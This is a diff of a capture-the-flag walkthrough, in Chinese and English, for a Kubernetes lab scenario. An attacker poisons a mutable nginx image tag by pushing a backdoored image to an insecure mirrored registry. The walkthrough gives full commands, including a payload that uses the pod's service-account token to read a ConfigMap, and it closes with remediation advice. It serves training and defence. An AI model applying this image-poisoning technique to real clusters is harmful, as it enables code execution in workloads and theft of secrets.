@@ -9,65 +9,53 @@
 | 技术/CVE | N/A (image tag mutation) |
 | 难度 | L2 |
 | 交付方式 | KIND / Kubernetes |
-| 入口 | KIND 集群内入口（无固定宿主端口） |
+| 入口 | localhost:10501 |
 
 ## 场景概述
-- 技术：N/A (image tag mutation)
+- 技术：N/A (image tag mutation) -- 可变 tag + Always 拉取 + 镜像仓库镜像配置
 - 难度：L2
 - 交付方式：k8s
+
 ## 攻击路径与利用步骤
 
 ## Overview
 | Property | Value |
 |----------|-------|
-| CVE/Technique | N/A (misconfiguration) -- mutable image tag with AlwaysPull |
+| CVE/Technique | N/A -- mutable image tag with imagePullPolicy: Always |
 | Difficulty | L2 |
 | Type | k8s (KIND cluster) |
 | Cluster Name | cve-k8s-15-image-tag |
+| Registry | localhost:10501 (no TLS, on the kind network as `registry`) |
 | Flag Location | ConfigMap `app-config` in namespace `default` |
 
 ## Attack Path Summary
 1. A Deployment uses `image: nginx:1.24-alpine` with `imagePullPolicy: Always`
-2. An insecure local Docker registry runs on `localhost:5000`
-3. The target deployment pulls from Docker Hub with mutable tag `nginx:1.24-alpine`
-4. The attacker pushes a malicious image to the insecure registry with the same tag name
-5. The cluster's containerd is configured to mirror `nginx:1.24-alpine` pulls to the local registry
-6. When the pod restarts, it pulls the attacker's backdoored image
-7. The backdoored container reads the flag from the ConfigMap
+2. The cluster's containerd mirrors `docker.io` pulls to a local registry (`http://registry:5000`) published on host port 10501
+3. The attacker pushes a malicious image to the registry under the mirrored path `library/nginx:1.24-alpine`
+4. Deleting the pod forces a re-pull; the Deployment runs the attacker's image
+5. The backdoored payload uses the pod SA token to read ConfigMap `app-config` and writes the flag to `/tmp/flag_found.txt`
 
 ## Prerequisites
 - kubectl access to KIND cluster `cve-k8s-15-image-tag`
 - Docker CLI with access to the host Docker daemon
-- Network access to `localhost:5000`
-- Understanding of containerd registry mirroring
+- Network access to `localhost:10501`
 
 ## Step-by-Step Exploitation
 
 ### Step 1: Verify the Setup
 ```bash
-# Verify the registry is running
-curl -s http://localhost:5000/v2/
+curl -s http://localhost:10501/v2/
 # Expected: {}
 
-# Check the containerd registry mirror configuration
-# The cluster's containerd is configured to mirror images through the local registry
-
-# Verify the vulnerable deployment exists
 kubectl get deploy vulnerable-app
-# Expected: NAME             READY   UP-TO-DATE   AVAILABLE   AGE
-#           vulnerable-app   1/1     1            1           ...
+# Expected: image nginx:1.24-alpine, imagePullPolicy Always
 
-# Check the ConfigMap with the flag
 kubectl get configmap app-config
-# Expected: NAME         DATA   AGE
-#           app-config   1      ...
+# The flag lives ONLY in this ConfigMap (not in any pod env)
 ```
 
-### Step 2: Build a Malicious Image
-Create a backdoored image that reads the flag:
-
+### Step 2: Build a Backdoored Image
 ```bash
-# Create the payload
 mkdir -p /tmp/supply-chain
 cat > /tmp/supply-chain/Dockerfile << 'EOF'
 FROM alpine:latest
@@ -77,114 +65,54 @@ RUN chmod +x /payload.sh
 CMD ["/payload.sh"]
 EOF
 
-# Create a payload that reads the ConfigMap and writes it somewhere
 cat > /tmp/supply-chain/payload.sh << 'PAYLOAD'
 #!/bin/sh
-# Read the flag from the Kubernetes API
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-APISERVER=https://kubernetes.default.svc
-
-# Try to get the ConfigMap
-FLAG=$(curl -s --cacert $CA_CERT --header "Authorization: Bearer $TOKEN" \
-    $APISERVER/api/v1/namespaces/default/configmaps/app-config 2>/dev/null | \
-    grep -o '"flag":"[^"]*"' | cut -d'"' -f4)
-
-if [ -z "$FLAG" ]; then
-    # Fallback: check environment variables
-    FLAG=$FLAG_ENV_VAR
-fi
-
-# Write the flag to a known location
-echo "FLAG: $FLAG" > /tmp/flag_found.txt
-
-# Sleep to keep the container alive
+CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+curl -s --cacert "$CA" -H "Authorization: Bearer $TOKEN" \
+  https://kubernetes.default.svc/api/v1/namespaces/default/configmaps/app-config \
+  | grep -o '"flag":"[^"]*"' | cut -d'"' -f4 > /tmp/flag_found.txt
 sleep 3600
 PAYLOAD
 
-docker build -t nginx:1.24-alpine /tmp/supply-chain/
+docker build -t localhost:10501/library/nginx:1.24-alpine /tmp/supply-chain/
 ```
 
-### Step 3: Push to the Local Registry
+### Step 3: Push to the Mirrored Registry
 ```bash
-# Tag the malicious image to match the target image name
-docker tag nginx:1.24-alpine localhost:5000/nginx:1.24-alpine
-
-# Push to the local registry (the one used as a mirror)
-docker push localhost:5000/nginx:1.24-alpine
-
-# Verify the push
-curl -s http://localhost:5000/v2/nginx/tags/list
-# Expected: {"name":"nginx","tags":["1.24-alpine"]}
+docker push localhost:10501/library/nginx:1.24-alpine
+curl -s http://localhost:10501/v2/library/nginx/tags/list
+# Expected: {"name":"library/nginx","tags":["1.24-alpine"]}
 ```
 
-### Step 4: Trigger Pod Restart
+> 注意：containerd 的 mirror 会把 `nginx:1.24-alpine`（即 `docker.io/library/nginx`）
+> 重写到 `http://registry:5000/v2/library/nginx`，所以必须推送到 `library/nginx`
+> 路径，而不是裸 `nginx`。
+
+### Step 4: Trigger Re-pull
 ```bash
-# Force the vulnerable deployment to restart and pull the new image
 kubectl delete pod -l app=vulnerable-app
-
-# Or scale down and up
-kubectl scale deploy vulnerable-app --replicas=0
-kubectl scale deploy vulnerable-app --replicas=1
+# Deployment recreates the pod with imagePullPolicy: Always -> pulls the poisoned image
+kubectl get pods -l app=vulnerable-app -w
 ```
 
-### Step 5: Monitor the Pod
+### Step 5: Read the Flag
 ```bash
-# Watch the pod restart
-kubectl get pods -w
-
-# After the new pod is running, check its logs
 NEW_POD=$(kubectl get pods -l app=vulnerable-app -o jsonpath='{.items[0].metadata.name}')
-kubectl logs $NEW_POD
-# Expected: FLAG: flag{k8s-15-*}
+kubectl exec "$NEW_POD" -- cat /tmp/flag_found.txt
+# Expected: flag{k8s-15-*}
 ```
 
-### Step 6: Alternative -- Direct ConfigMap Access
-If the pod's ServiceAccount has permissions (or the flag is in environment variables):
-
-```bash
-# Exec into the new pod
-kubectl exec -it $NEW_POD -- sh
-
-# Check for environment variables
-env | grep -i flag
-
-# Try to access the ConfigMap via the API
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
-    --header "Authorization: Bearer $TOKEN" \
-    https://kubernetes.default.svc/api/v1/namespaces/default/configmaps/app-config
-
-# Check the written flag file
-cat /tmp/flag_found.txt
-```
-
-### Step 7: Capture Flag
+## Flag Location
+- ConfigMap `app-config` in namespace `default` (readable by the workload SA via the
+  pre-configured `configmap-reader` RoleBinding)
 - Flag format: `flag{k8s-15-*}`
-- Flag location: ConfigMap `app-config` in namespace `default`
-- Access methods:
-  - Read from ConfigMap using pod's SA token (if permissions allow)
-  - Read from the ConfigMap via the backdoored image's payload
-  - Access the flag from environment variables (if configured in the deployment)
-- Expected output: `flag{k8s-15-default}` (or custom value from `CVE_FLAG`)
 
-## Verification Commands
+## Verification
 ```bash
-# Verify the cluster is deployed
-kubectl cluster-info --context kind-cve-k8s-15-image-tag
-
-# Verify the vulnerable deployment
-kubectl get deploy vulnerable-app
-
-# Check the ConfigMap
+cd cve_challenges/scenarios/k8s/mutable-image-tag && bash deploy.sh
 kubectl get configmap app-config -o jsonpath='{.data.flag}'
-
-# Verify the local registry is running
-curl -s http://localhost:5000/v2/_catalog
-
-# Quick exploit test
-kubectl run test-pod --image=nginx:1.24-alpine --image-pull-policy=Always --restart=Never --command -- sleep 30
-kubectl delete pod test-pod
+bash teardown.sh
 ```
 
 ## 此场景利用了哪些知识
@@ -192,10 +120,12 @@ kubectl delete pod test-pod
 | 规划维度 | 所需知识 |
 |---|---|
 | 环境与访问 | Container image tags, registries, and deployment rollouts |
-| 侦察与前置条件 | Mutable tag use and image digest/registry provenance |
+| 侦察与前置条件 | Mutable tag use, image digest/registry provenance, containerd mirror behavior |
 | 核心漏洞与利用 | Replace an image behind a trusted mutable tag |
 | 权限、横向或影响 | Supply-chain code execution in a workload |
 | 验证 | Verify the substituted workload exposes the flag |
 
 ## 修复建议
-升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
+使用不可变镜像 digest（`image@sha256:...`）并禁止 `latest`/可变 tag；镜像仓库启用
+写权限控制与推送审计；为 registry mirror 配置只读代理；生产环境用镜像签名
+（cosign/notation）与准入校验（Kyverno/Gatekeeper）。
